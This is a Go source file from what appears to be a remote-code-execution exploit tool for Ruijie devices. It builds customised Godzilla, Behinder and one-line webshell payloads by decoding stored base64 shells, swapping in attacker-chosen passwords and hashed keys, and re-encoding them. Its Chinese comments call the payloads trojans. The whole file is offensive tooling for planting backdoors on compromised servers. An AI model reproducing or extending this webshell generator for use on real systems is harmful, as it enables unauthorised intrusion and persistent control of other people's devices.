package funcs

import (
	"RuijieRCE/vars"
	"crypto/md5"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"strings"
)

func md5key(data string) string {
	//冰蝎密码，哥斯拉密钥md5加密
	h := md5.New()
	h.Write([]byte(data))
	return hex.EncodeToString(h.Sum(nil))[0:16]
}

func Godzilla(pass, key string) string {
	//自定义哥斯拉马
	switch  {
	case pass == "pass" && key == "key":
		code := vars.Godzilla
		return code

	case pass != "pass" && key == "key":
		shell, _ := base64.StdEncoding.DecodeString(vars.Godzilla)
		data := strings.Replace(string(shell), "pass", pass, -1)
		code := base64.StdEncoding.EncodeToString([]byte(data))
		return code

	case pass != "pass" && key != "key":
		key = md5key(key)
		shell, _ := base64.StdEncoding.DecodeString(vars.Godzilla)
		data := strings.Replace(string(shell), "pass", pass, -1)
		data = strings.Replace(data, "3c6e0b8a9c15224a", key, -1)
		code := base64.StdEncoding.EncodeToString([]byte(data))
		return code

	case pass == "pass" && key != "key":
		key = md5key(key)
		shell, _ := base64.StdEncoding.DecodeString(vars.Godzilla)
		data := strings.Replace(string(shell), "3c6e0b8a9c15224a", key, -1)
		code := base64.StdEncoding.EncodeToString([]byte(data))
		return code
	default:
		return ""
	}
}

func Behinder(pass string) string {
	//自定义冰蝎马
	if pass == "rebeyond" {
		return vars.Behinder
	}
	pass = md5key(pass)
	shell, _ := base64.StdEncoding.DecodeString(vars.Behinder)
	data := strings.Replace(string(shell), "e45e329feb5d925b", pass, -1)
	data = base64.StdEncoding.EncodeToString([]byte(data))
	return data
}

func ShellCode(pass, name string) string {
	//自定义一句话木马
	switch  {
	case pass == "cmd" && name == "cmd":
		return vars.Shellcode

	case pass != "cmd" && name == "cmd":
		h := sha256.New()
		h.Write([]byte(pass))
		replace := hex.EncodeToString(h.Sum(nil))
		shell, _ := base64.StdEncoding.DecodeString(vars.Shellcode)
		data := strings.Replace(string(shell), "04dc5b2136328a0dcb189df97734c7c72e5e1227fa0c03469a6ce608f32f1b66", replace, -1)
		data = base64.StdEncoding.EncodeToString([]byte(data))
		return data

	case pass != "cmd" && name != "cmd":
		h := sha256.New()
		h.Write([]byte(pass))
		replace := hex.EncodeToString(h.Sum(nil))
		shell, _ := base64.StdEncoding.DecodeString(vars.Shellcode)
		data := strings.Replace(string(shell), "04dc5b2136328a0dcb189df97734c7c72e5e1227fa0c03469a6ce608f32f1b66", replace, -1)
		base := base64.StdEncoding.EncodeToString([]byte(data))

		shell, _ = base64.StdEncoding.DecodeString(base)
		data = strings.Replace(string(shell), "cmd", name, -1)
		base = base64.StdEncoding.EncodeToString([]byte(data))
		return base

	case pass == "cmd" && name != "cmd":
		shell, _ := base64.StdEncoding.DecodeString(vars.Shellcode)
		data := strings.Replace(string(shell), "cmd", name, -1)
		data = base64.StdEncoding.EncodeToString([]byte(data))
		return data
	}
	return ""
}

func Config() (string, string, string) {
	var pass string
	var key string

	switch  {
	case vars.NAME == "":
		//一句话木马
		if vars.PASS == "" {
			pass = "cmd"
		} else {
			pass = vars.PASS
		}
		if vars.KEY == "" {
			key = "cmd"
		} else {
			key = vars.KEY
		}
		return "", pass, key

	case vars.NAME == "B":
		//冰蝎马
		if vars.PASS == "" {
			pass = "rebeyond"
		} else {
			pass = vars.PASS
		}
		return "B", pass, ""

	case vars.NAME == "G":
		//哥斯拉马
		if vars.PASS == "" {
			pass = "pass"
		} else {
			pass = vars.PASS
		}
		if vars.KEY == "" {
			key = "key"
		} else {
			key = vars.KEY
		}
		return "G", pass, key

	default:
		return "", "", ""
	}
}
